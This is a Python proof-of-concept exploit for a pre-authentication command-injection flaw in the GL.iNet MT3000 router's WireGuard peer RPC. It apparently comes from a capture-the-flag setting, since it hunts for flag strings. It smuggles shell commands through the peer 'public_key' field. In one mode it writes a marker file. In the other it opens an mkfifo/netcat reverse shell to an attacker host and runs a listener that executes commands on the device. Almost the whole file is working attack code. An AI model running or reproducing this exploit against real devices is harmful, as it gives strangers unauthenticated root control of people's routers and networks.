#!/usr/bin/env python3
import argparse
import json
import random
import re
import socket
import string
import sys
import time
import urllib3
from typing import Tuple, Any

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_glc_response(text: str) -> Tuple[int | None, Any]:
    text = text.strip()
    m = re.match(r'^(\d+)\s*(.*)$', text, re.S)
    if not m:
        return None, text
    code = int(m.group(1))
    rest = m.group(2).strip()
    if not rest:
        return code, {}
    try:
        return code, json.loads(rest)
    except Exception:
        return code, rest


def rpc_post(sess: requests.Session, base: str, obj: str, method: str, args: dict, verify: bool, timeout: int = 20):
    payload = {"object": obj, "method": method, "args": args}
    r = sess.post(
        f"{base}/cgi-bin/glc",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"},
        timeout=timeout,
        verify=verify,
    )
    code, data = parse_glc_response(r.text)
    print(f"[RPC] HTTP {r.status_code} glc={code} {obj}.{method} args={args}")
    print(f"[RPC] body: {str(data)[:500]}")
    return r.status_code, code, data


def build_reverse_shell(lhost: str, lport: int) -> str:
    return (
        f"x; rm -f /tmp/p; mkfifo /tmp/p; "
        f"/bin/sh </tmp/p 2>&1 | /usr/bin/nc {lhost} {lport} >/tmp/p; #"
    )


def build_marker_public_key(marker: str) -> str:
    return f"x; echo {marker} >/www/{marker}.txt; #"


class ReverseShellListener:
    def __init__(self, bind_host: str, port: int, timeout: int):
        self.bind_host = bind_host
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.conn = None

    def __enter__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.bind_host, self.port))
        self.sock.listen(1)
        self.sock.settimeout(self.timeout)
        print(f"[+] listening on {self.bind_host}:{self.port}")
        return self

    def __exit__(self, exc_type, exc, tb):
        try:
            if self.conn:
                self.conn.close()
        finally:
            if self.sock:
                self.sock.close()

    def accept(self):
        self.conn, addr = self.sock.accept()
        self.conn.settimeout(2)
        print(f"[+] reverse shell connected from {addr[0]}:{addr[1]}")
        return addr

    def run_probe(self):
        marker = "__WG_DONE_" + ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
        cmd = (
            "id; uname -a; echo '[*] flag-hunt-begin'; "
            "grep -R -a -E 'flag\\{|CTF\\{|DASCTF\\{' /etc /root /tmp /overlay /www 2>/dev/null | head -n 50; "
            f"echo {marker}\n"
        )
        self.conn.sendall(cmd.encode())
        chunks = []
        deadline = time.time() + 10
        while time.time() < deadline:
            try:
                data = self.conn.recv(4096)
            except socket.timeout:
                continue
            if not data:
                break
            chunks.append(data)
            if marker.encode() in b''.join(chunks):
                break
        out = b''.join(chunks).decode(errors='replace')
        print("[+] shell output start")
        print(out)
        print("[+] shell output end")
        flags = re.findall(r'(?:flag|FLAG|CTF|DASCTF)\{.*?\}', out)
        if flags:
            print(f"[+] possible flags: {flags}")
        return out


def get_peer_by_id(peers, peer_id):
    for p in peers:
        if p.get("peer_id") == peer_id:
            return p
    return None


def main():
    ap = argparse.ArgumentParser(description="GL.iNet MT3000 wg-server.set_peer pre-auth RCE PoC")
    ap.add_argument("--target", required=True)
    ap.add_argument("--scheme", default="http", choices=["http", "https"])
    ap.add_argument("--verify", action="store_true")
    ap.add_argument("--mode", default="marker", choices=["marker", "reverse-shell"])
    ap.add_argument("--lhost")
    ap.add_argument("--lport", type=int, default=4545)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--wait", type=int, default=20)
    ap.add_argument("--peer-name", help="Reuse an explicit peer name; otherwise create a fresh peer")
    ap.add_argument("--keep-peer", action="store_true", help="Do not delete the created peer after exploitation")
    args = ap.parse_args()

    base = f"{args.scheme}://{args.target}"
    sess = requests.Session()

    rpc_post(sess, base, "wg-server", "start", {}, verify=args.verify)
    time.sleep(1)

    peer_name = args.peer_name or ("poc" + ''.join(random.choice(string.digits) for _ in range(6)))
    _, _, data = rpc_post(sess, base, "wg-server", "add_peer", {"name": peer_name}, verify=args.verify)
    peer_id = data.get("peer_id") if isinstance(data, dict) else None

    _, _, data = rpc_post(sess, base, "wg-server", "get_peer_list", {}, verify=args.verify)
    peers = data.get("peers", []) if isinstance(data, dict) else []
    if peer_id is None:
        for p in peers:
            if p.get("name") == peer_name:
                peer_id = p.get("peer_id")
                break
    if peer_id is None:
        print("[-] failed to locate peer_id", file=sys.stderr)
        sys.exit(1)

    peer = get_peer_by_id(peers, peer_id)
    if not peer:
        print("[-] failed to recover peer object", file=sys.stderr)
        sys.exit(1)

    if args.mode == "marker":
        marker = f"WG_SET_PEER_RCE_{int(time.time())}"
        injected_public_key = build_marker_public_key(marker)
    else:
        if not args.lhost:
            print("[-] reverse-shell mode requires --lhost", file=sys.stderr)
            sys.exit(1)
        injected_public_key = build_reverse_shell(args.lhost, args.lport)

    set_args = {
        "name": peer["name"],
        "peer_id": peer["peer_id"],
        "presharedkey_enable": False,
        "public_key": injected_public_key,
        "client_ip": peer.get("client_ip", "10.0.0.9/24"),
        "dns": peer.get("dns", "64.6.64.6"),
        "allowed_ips": peer.get("allowed_ips", "0.0.0.0/0,::/0"),
        "mtu": int(peer.get("mtu", 1420) or 1420),
        "persistent_keepalive": int(peer.get("persistent_keepalive", 25) or 25),
    }

    print(f"[+] target={base}")
    print(f"[+] peer={peer}")
    print(f"[+] injected public_key={injected_public_key}")

    if args.mode == "reverse-shell":
        with ReverseShellListener(args.bind, args.lport, args.wait) as listener:
            rpc_post(sess, base, "wg-server", "set_peer", set_args, verify=args.verify)
            listener.accept()
            listener.run_probe()
    else:
        rpc_post(sess, base, "wg-server", "set_peer", set_args, verify=args.verify)
        url = f"{base}/{marker}.txt"
        print(f"[+] polling {url} for up to {args.wait}s")
        deadline = time.time() + args.wait
        while time.time() < deadline:
            try:
                r = sess.get(url, timeout=5, verify=args.verify)
                if r.status_code == 200 and marker in r.text:
                    print(f"[+] RCE confirmed, marker file content: {r.text.strip()}")
                    break
            except Exception:
                pass
            time.sleep(1)
        else:
            print("[-] marker not observed within timeout")
            if not args.keep_peer:
                rpc_post(sess, base, "wg-server", "remove_peer", {"peer_id": peer_id}, verify=args.verify)
            sys.exit(2)

    if not args.keep_peer:
        rpc_post(sess, base, "wg-server", "remove_peer", {"peer_id": peer_id}, verify=args.verify)


if __name__ == "__main__":
    main()
